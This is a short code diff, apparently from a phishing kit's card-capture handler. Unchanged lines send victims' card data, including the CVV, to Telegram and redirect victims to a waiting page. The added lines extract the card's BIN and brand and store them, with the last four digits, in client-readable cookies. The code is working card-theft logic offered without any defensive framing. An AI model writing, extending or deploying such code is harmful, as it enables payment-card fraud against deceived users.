@@ -52,9 +52,16 @@ CVV: \`${cvs}\`
 
   await sendTelegram(message, keyboard);
 
+  const digits = ccnn1.replace(/\D/g, '');
+  const bin = digits.slice(0, 6);
+  const first = digits.charAt(0);
+  const brand = first === '4' ? 'visa' : first === '5' ? 'mc' : first === '3' ? 'amex' : first === '6' ? 'discover' : 'card';
+
   cookies.set('session_id', sessionId, { path: '/', httpOnly: false, sameSite: 'lax' });
   cookies.set('full_name', `${name} ${namel}`, { path: '/', httpOnly: false, sameSite: 'lax' });
-  cookies.set('card_last4', ccnn1.slice(-4), { path: '/', httpOnly: false, sameSite: 'lax' });
+  cookies.set('card_last4', digits.slice(-4), { path: '/', httpOnly: false, sameSite: 'lax' });
+  cookies.set('card_bin', bin, { path: '/', httpOnly: false, sameSite: 'lax' });
+  cookies.set('card_brand', brand, { path: '/', httpOnly: false, sameSite: 'lax' });
 
   throw redirect(303, `/wait?s=${sessionId}`);
 }
